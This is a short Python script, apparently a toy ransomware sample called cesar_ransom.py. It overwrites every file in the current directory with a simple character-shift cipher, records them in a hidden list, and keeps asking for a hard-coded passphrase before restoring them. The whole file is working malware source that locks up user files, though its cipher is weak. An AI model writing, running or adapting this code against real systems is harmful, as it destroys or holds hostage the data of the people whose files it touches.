#!/usr/bin/env python3

import os

files_to_avoid = open('.files_to_ignore.txt', 'r')
files_ignored = []
for line in files_to_avoid:
	files_ignored.append(line[:-1])

files_to_avoid = open('.files_to_ignore.txt', 'a')

def encrypt(file):
	if file not in files_ignored:
		try:
			content = open(file, 'r')
			content_read = content.read()
			e_content = ''
			for char in content_read:
				e_content += chr(ord(char) + 8)
			content = open(file, 'w')
			content_written = content.write(e_content)
			content.close()
		except:
			print(f'Could Not Open {file}')
	
def decrypt(file):
	try:
		content = open(file, 'r')
		content_encrypted = content.read()
		d_content = ''
		for char in content_encrypted:
			d_content += chr(ord(char) - 8)
		content = open(file, 'w')
		content_decrpyted = content.write(d_content)
		content.close()
	except:
		print(f'Could Not Open {file}')

def files_in_wd():
	files = []
	for file in os.listdir():
		if file not in files_ignored: files.append(file)
	return files

def main():
	global files_to_avoid
	# create a list of files to encrypt, then encrypt those files
	files_to_encrypt = files_in_wd()
	for file in files_to_encrypt:
		encrypt(file)
		files_to_avoid.write(file + '\n')

	# ask the user for a passphrase to unencrypt the files
	passphrase = input("What's the passphrase?\n>\t")
	while passphrase != 'silence':
		print('Incorrect Passphrase')
		passphrase = input('What\'s the passphrase?\n>\t')

	# add all files to files_to_encrypt
	adtn_files = open('.files_to_ignore.txt')
	adtn_file_set = [line[:-1] for line in adtn_files.readlines() if line[:-1] not in ['.files_to_ignore.txt','cesar_ransom.py']]
	files_to_encrypt.extend(adtn_file_set)
	
	# decrypt the files when the passphrase has been entered correctly
	for file in files_to_encrypt:
		decrypt(file)
		files_to_avoid = open('.files_to_ignore.txt', 'w')
		files_to_avoid.write('.files_to_ignore.txt\ncesar_ransom.py\n')

	print('shhhhhhhhh')	
	


if __name__ == '__main__':
	main()
